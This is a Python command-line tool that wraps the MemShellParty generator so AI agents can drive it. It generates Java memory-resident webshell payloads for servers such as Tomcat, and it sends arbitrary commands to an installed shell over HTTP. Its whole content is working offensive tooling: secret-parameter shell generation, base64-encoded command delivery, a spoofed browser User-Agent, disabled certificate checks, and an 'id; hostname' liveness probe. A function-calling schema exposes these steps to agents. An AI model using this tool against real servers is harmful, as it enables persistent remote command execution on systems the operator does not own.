#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AIMS — AI-friendly wrapper for MemShellParty.

Core commands (generic, no target-specific delivery):
  up       start local MemShellParty (Docker, 127.0.0.1:8080)
  caps     show supported servers / shell types / tools / packers
  gen      generate a payload and save it to a file + state
  exec     talk to a Command memory shell (paramName protocol)
  status   liveness check
  schema   machine-readable command schema (for AI function calling)
  doctor   environment checks

Delivery is intentionally NOT built in: use the generated payload with your
existing injection vector. See examples/ for scenario extensions.

Generation is 100% MemShellParty (MIT):
https://github.com/MemShellParty/MemShellParty
"""
import argparse
import base64
import hashlib
import json
import os
import secrets
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

VERSION = "0.2.0"
DEFAULT_MSP = "http://127.0.0.1:8080"
MSP_IMAGE = "reajason/memshell-party:latest"
STATE = Path(os.path.expanduser("~/.aims/state.json"))


class Err(Exception):
    def __init__(self, code, message, data=None):
        super().__init__(message)
        self.code, self.message, self.data = code, message, data or {}


def http(method, url, data=None, headers=None, timeout=30):
    hdrs = dict(headers or {})
    if data is not None and "Content-Type" not in hdrs:
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    try:
        with op.open(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        raise Err("E_NET", "network error: %s" % e)


def jbody(b):
    try:
        return json.loads(b.decode("utf-8", "replace"))
    except Exception:
        return None


def msp():
    return os.environ.get("AIMS_MSP", DEFAULT_MSP).rstrip("/")


def msp_ok():
    try:
        s, b = http("GET", msp() + "/api/config", timeout=5)
        return s == 200 and jbody(b) is not None
    except Err:
        return False


def docker(*args, timeout=300):
    try:
        return subprocess.run(["docker"] + list(args), capture_output=True, text=True, timeout=timeout)
    except Exception:
        return None


def kv(pairs):
    out = {}
    for p in pairs or []:
        if "=" not in p:
            raise Err("E_USAGE", "expected key=value, got %r" % p)
        k, v = p.split("=", 1)
        out[k] = v
    return out


def load_state():
    try:
        return json.loads(STATE.read_text(encoding="utf-8"))
    except Exception:
        return {}


def save_state(st):
    STATE.parent.mkdir(parents=True, exist_ok=True)
    try:
        os.chmod(STATE.parent, 0o700)
    except OSError:
        pass
    STATE.write_text(json.dumps(st, ensure_ascii=False, indent=2), encoding="utf-8")
    try:
        os.chmod(STATE, 0o600)
    except OSError:
        pass


def encode_cmd(cmd, encryptor):
    e = (encryptor or "RAW").upper()
    if e == "RAW":
        return cmd
    if e == "BASE64":
        return base64.b64encode(cmd.encode()).decode()
    if e == "DOUBLE_BASE64":
        return base64.b64encode(base64.b64encode(cmd.encode())).decode()
    raise Err("E_USAGE", "unsupported encryptor: %s" % encryptor)


def shell_call(url, param, cmd, encryptor="RAW", timeout=30):
    value = encode_cmd(cmd, encryptor)
    body = urllib.parse.urlencode({param: value}).encode()
    status, raw = http("POST", url, body,
                       {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"},
                       timeout=timeout)
    text = raw.decode("utf-8", "replace")
    if status != 200 or "<!DOCTYPE html>" in text[:200]:
        raise Err("E_SHELL", "shell not responding (HTTP %s)" % status)
    return text


def ext_for(packer):
    p = (packer or "").lower()
    if "jsp" in p:
        return ".jsp"
    if "deserialize" in p or "serial" in p:
        return ".ser"
    if "jar" in p or "agent" in p:
        return ".jar"
    if "base64" in p:
        return ".b64"
    return ".payload"


# ---------------------------------------------------------------------------

def cmd_schema(args, st):
    return {
        "name": "aims",
        "version": VERSION,
        "description": "Generate MemShellParty payloads and talk to Command memory shells.",
        "commands": {
            "up": {"description": "Start local MemShellParty."},
            "caps": {"description": "List servers/tools/types/packers.",
                     "args": {"--server": "show tools/types for one server",
                              "--tool": "show config params for one shell tool",
                              "--packers": "show packer tree"}},
            "gen": {"description": "Generate a payload; writes a file and state.",
                    "args": {"--server": "Tomcat|Jetty|SpringWebMvc|...",
                             "--version": "server version (default unknown)",
                             "--type": "shell type, e.g. Filter (default Filter)",
                             "--tool": "shell tool, e.g. Command (default Command)",
                             "--jre": "class file version, 52 = Java 8 (default 52)",
                             "--packer": "payload format (default DefaultBase64)",
                             "--param": "Command paramName (secret; random if omitted)",
                             "--pattern": "injector urlPattern (default /*)",
                             "--target": "optional target base URL; builds shell_url",
                             "--tool-config": "k=v, repeatable",
                             "--injector-config": "k=v, repeatable",
                             "--out": "output file",
                             "--print": "include payload in JSON"}},
            "exec": {"description": "Execute on a Command shell.",
                     "args": {"--url": "shell URL", "--param": "paramName",
                              "--encryptor": "RAW|BASE64|DOUBLE_BASE64", "cmd": "command"}},
            "status": {"description": "id through the shell."},
            "doctor": {"description": "Environment checks."},
            "schema": {"description": "This schema."}
        },
        "state": str(STATE),
        "env": {"AIMS_MSP": "MemShellParty URL (default %s)" % DEFAULT_MSP},
        "upstream": "MemShellParty (MIT) https://github.com/MemShellParty/MemShellParty",
        "delivery": "Use the generated payload with your own injection vector; see examples/."
    }


def cmd_doctor(args, st):
    checks = {"memshell_party": msp_ok()}
    d = docker("info", timeout=10)
    checks["docker"] = bool(d and d.returncode == 0)
    try:
        s, _ = http("GET", msp() + "/api/config/packers/tree", timeout=5)
        checks["packers"] = s == 200
    except Err:
        checks["packers"] = False
    return {"checks": checks, "state": str(STATE), "target": st.get("target"),
            "shell_url": st.get("shell_url"), "param": st.get("param"),
            "packer": st.get("packer")}


def cmd_up(args, st):
    if msp_ok():
        return {"already_running": True, "url": msp()}
    di = docker("info", timeout=10)
    if not di or di.returncode != 0:
        raise Err("E_NET", "docker not available")
    docker("rm", "-f", "memshell-party")
    d = docker("run", "-d", "--name", "memshell-party", "-p", "127.0.0.1:8080:8080", MSP_IMAGE)
    if not d or d.returncode != 0:
        raise Err("E_NET", "docker run failed: %s" % (d.stderr if d else "docker error"))
    for _ in range(30):
        if msp_ok():
            return {"already_running": False, "url": msp()}
        time.sleep(1)
    raise Err("E_NET", "MemShellParty did not start")


def cmd_caps(args, st):
    s, b = http("GET", msp() + "/api/config", timeout=10)
    cfg = jbody(b)
    if s != 200 or cfg is None:
        raise Err("E_GEN", "MemShellParty not reachable (%s)" % msp())
    if args.packers:
        s, b = http("GET", msp() + "/api/config/packers/tree", timeout=10)
        return {"packers": jbody(b)}
    if args.tool:
        s, b = http("GET", msp() + "/api/config/shelltool/configs", timeout=10)
        for item in jbody(b) or []:
            if item.get("tool") == args.tool:
                return {"tool": args.tool, "params": item.get("params")}
        raise Err("E_USAGE", "unknown tool: %s" % args.tool)
    if args.server:
        if args.server not in cfg:
            raise Err("E_USAGE", "unknown server: %s" % args.server)
        return {"server": args.server, "tools": cfg[args.server]}
    return {"servers": sorted(cfg.keys())}


def cmd_gen(args, st):
    if not msp_ok():
        raise Err("E_GEN", "MemShellParty not reachable (%s); run: aims.py up" % msp())
    tool_conf = kv(args.tool_config)
    inj_conf = kv(args.injector_config)
    if args.tool == "Command":
        if args.param:
            tool_conf["paramName"] = args.param
        tool_conf.setdefault("paramName", secrets.token_hex(4))
        tool_conf.setdefault("encryptor", "BASE64")
    inj_conf.setdefault("urlPattern", args.pattern)
    inj_conf.setdefault("staticInitialize", True)
    body = {
        "shellConfig": {
            "server": args.server,
            "serverVersion": args.version,
            "shellTool": args.tool,
            "shellType": args.type,
            "targetJreVersion": args.jre,
            "shrink": True,
            "lambdaSuffix": True,
        },
        "shellToolConfig": tool_conf,
        "injectorConfig": inj_conf,
        "packer": args.packer,
    }
    status, raw = http("POST", msp() + "/api/memshell/generate",
                       json.dumps(body).encode(), {"Content-Type": "application/json"}, timeout=60)
    resp = jbody(raw)
    if status != 200 or not resp or not resp.get("packResult"):
        raise Err("E_GEN", "generator failed (HTTP %s)" % status,
                  {"body": raw[:300].decode("utf-8", "replace")})
    payload = resp["packResult"]
    msr = resp.get("memShellResult") or {}
    sha = hashlib.sha256(payload.encode()).hexdigest()[:16]
    out = args.out
    if not out:
        pdir = STATE.parent / "payloads"
        pdir.mkdir(parents=True, exist_ok=True)
        out = str(pdir / (sha + ext_for(args.packer)))
    Path(out).parent.mkdir(parents=True, exist_ok=True)
    Path(out).write_text(payload, encoding="utf-8")
    try:
        os.chmod(out, 0o600)
    except OSError:
        pass

    stc = msr.get("shellToolConfig") or {}
    param = (stc.get("paramName") or tool_conf.get("paramName")) if args.tool == "Command" else None
    encryptor = (stc.get("encryptor") or tool_conf.get("encryptor") or "BASE64") if args.tool == "Command" else None
    pattern = (msr.get("injectorConfig") or {}).get("urlPattern") or inj_conf.get("urlPattern") or "/*"
    target = args.target.rstrip("/") if args.target else None
    st.update({
        "target": target, "server": args.server, "version": args.version,
        "type": args.type, "tool": args.tool, "packer": args.packer,
        "param": param, "encryptor": encryptor, "pattern": pattern,
        "shell_url": (target + pattern) if (target and pattern) else None,
        "payload_file": out, "payload_sha256": sha,
        "injector_class": msr.get("injectorClassName"),
        "shell_class": msr.get("shellClassName"),
        "injector_size": msr.get("injectorSize"), "shell_size": msr.get("shellSize"),
        "shell_tool_config": stc,
        "injector_config": {"urlPattern": pattern, "staticInitialize": inj_conf.get("staticInitialize")},
        "generated_at": int(time.time()),
    })
    save_state(st)
    data = {k: st.get(k) for k in ("server", "version", "type", "tool", "packer", "target",
                                   "pattern", "shell_url", "param", "encryptor",
                                   "payload_file", "payload_sha256", "injector_class",
                                   "shell_class", "injector_size", "shell_size")}
    if args.print:
        data["payload"] = payload
    return data


def cmd_exec(args, st):
    url = args.url or st.get("shell_url")
    param = args.param or st.get("param")
    if not url or not param:
        raise Err("E_USAGE", "need --url and --param (or run gen with --target)")
    encryptor = args.encryptor or st.get("encryptor") or "RAW"
    cmd = args.shell_cmd if args.shell_cmd is not None else (sys.stdin.read() if not sys.stdin.isatty() else "")
    if args.rest:
        cmd = (cmd + " " + " ".join(args.rest)).strip()
    if not cmd:
        raise Err("E_USAGE", "no command")
    out = shell_call(url, param, cmd, encryptor)
    return {"url": url, "param": param, "encryptor": encryptor, "cmd": cmd, "output": out}


def cmd_status(args, st):
    url = args.url or st.get("shell_url")
    param = args.param or st.get("param")
    if not url or not param:
        raise Err("E_USAGE", "need --url and --param (or run gen with --target)")
    encryptor = args.encryptor or st.get("encryptor") or "RAW"
    out = shell_call(url, param, "id; hostname", encryptor)
    return {"url": url, "alive": "uid=" in out, "output": out}


def main(argv=None):
    p = argparse.ArgumentParser(prog="aims", description="AI-friendly MemShellParty wrapper")
    sub = p.add_subparsers(dest="cmd", required=True)

    q = sub.add_parser("schema")
    q.set_defaults(fn=cmd_schema)
    q = sub.add_parser("doctor")
    q.set_defaults(fn=cmd_doctor)
    q = sub.add_parser("up")
    q.set_defaults(fn=cmd_up)

    q = sub.add_parser("caps")
    q.add_argument("--server", default=None)
    q.add_argument("--tool", default=None)
    q.add_argument("--packers", action="store_true")
    q.set_defaults(fn=cmd_caps)

    q = sub.add_parser("gen")
    q.add_argument("--server", required=True)
    q.add_argument("--version", default="unknown")
    q.add_argument("--type", default="Filter")
    q.add_argument("--tool", default="Command")
    q.add_argument("--jre", type=int, default=52)
    q.add_argument("--packer", default="DefaultBase64")
    q.add_argument("--param", default=None)
    q.add_argument("--pattern", default="/*")
    q.add_argument("--target", default=None)
    q.add_argument("--tool-config", action="append", default=[])
    q.add_argument("--injector-config", action="append", default=[])
    q.add_argument("--out", default=None)
    q.add_argument("--print", action="store_true")
    q.set_defaults(fn=cmd_gen)

    q = sub.add_parser("exec")
    q.add_argument("--url", default=None)
    q.add_argument("--param", default=None)
    q.add_argument("--encryptor", default=None)
    q.add_argument("shell_cmd", nargs="?")
    q.add_argument("rest", nargs=argparse.REMAINDER)
    q.set_defaults(fn=cmd_exec)

    q = sub.add_parser("status")
    q.add_argument("--url", default=None)
    q.add_argument("--param", default=None)
    q.add_argument("--encryptor", default=None)
    q.set_defaults(fn=cmd_status)

    args = p.parse_args(argv)
    st = load_state()
    try:
        data = args.fn(args, st)
        out = {"ok": True, "command": args.cmd, "data": data, "error": None}
        code = 0
    except Err as e:
        out = {"ok": False, "command": args.cmd, "data": e.data,
               "error": {"code": e.code, "message": e.message}}
        code = 1
    except Exception as e:
        out = {"ok": False, "command": args.cmd, "data": {},
               "error": {"code": "E_INTERNAL", "message": "%s: %s" % (type(e).__name__, e)}}
        code = 1
    print(json.dumps(out, ensure_ascii=False))
    return code


if __name__ == "__main__":
    sys.exit(main())
